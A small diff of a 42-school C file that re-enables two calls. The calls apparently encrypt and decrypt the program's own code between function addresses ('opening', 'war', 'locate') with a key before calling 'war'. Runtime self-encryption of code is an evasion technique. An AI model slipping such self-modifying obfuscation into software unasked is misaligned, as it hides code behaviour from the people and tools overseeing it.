@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/27 12:20:54 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/01 18:06:52 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/02 11:31:51 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -81,7 +81,8 @@ void	opening(t_data *data)
 	data->context = true;
 
 ERR:
-	/* update_two(&data->key, (char*)opening, (size_t)war - (size_t)opening); */
-	/* revert_two(&data->key, (char*)war, (size_t)locate - (size_t)war); */
+
+	update_two(&data->key, (char*)opening, (size_t)war - (size_t)opening);
+	revert_two(&data->key, (char*)war, (size_t)locate - (size_t)war);
 	war(data);
 }
